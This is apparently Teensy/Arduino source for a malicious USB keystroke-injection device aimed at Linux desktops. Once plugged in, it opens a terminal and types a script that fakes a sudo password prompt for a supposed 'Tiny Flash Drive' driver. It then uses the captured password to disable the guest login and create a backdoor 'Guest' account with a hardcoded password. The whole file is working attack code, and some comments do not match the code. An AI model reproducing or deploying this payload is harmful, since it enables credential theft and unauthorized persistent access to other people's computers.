  
void setup() {
  Serial.begin(9600);
  delay(1000);
}

void loop() {
  // press ALT while still holding CTRL
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_ALT);
  Keyboard.send_now();
  
  // press DELETE, while CLTR and ALT still held
  Keyboard.set_key1(KEY_T);
  Keyboard.send_now();
  
  // release all the keys at the same instant
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);	
  Keyboard.send_now();
  

// #!/bin/bash
Keyboard.print("echo \"\" > tmp");
Keyboard.print("stty -echo");
Keyboard.print("clear");
Keyboard.print("while :");
Keyboard.print("do");
Keyboard.print("   s=$(<tmp)");
Keyboard.print("   set -- $s");
Keyboard.print("   if [ -z \"$s\" ]; then");
Keyboard.print("     : #echo \"file contains $s\"");
Keyboard.print("   else");
                     //disable the guest account
Keyboard.print("     echo $s | sudo -S sh -c 'printf \"[SeatDefaults]\nallow-guest=false\n\" >/usr/share/lightdm/lightdm.conf.d/50-no-guest.conf'");
                     // replace it with a new guest account with root privledges
Keyboard.print("     echo $s | sudo -S useradd -ou 1111 -g 1111 Guest -b /home/Guest");
Keyboard.print("     echo $s | sudo -S echo \"Guest:hardToGuessPassword\" | chpasswd");
Keyboard.print("     exit 0");
Keyboard.print("   fi");
Keyboard.print("   sleep 0.5");
Keyboard.print("done &");
Keyboard.print("stty echo");
Keyboard.print("echo \"Driver installation for 'Tiny Flash Drive' requires root privledges.\"");
Keyboard.print("stty -echo");
Keyboard.print("read -p \"[sudo] password for $USER: \" PASSWORD; echo");
Keyboard.print("stty echo");
Keyboard.print("echo \"$PASSWORD\" > tmp");

delay(300000);
}
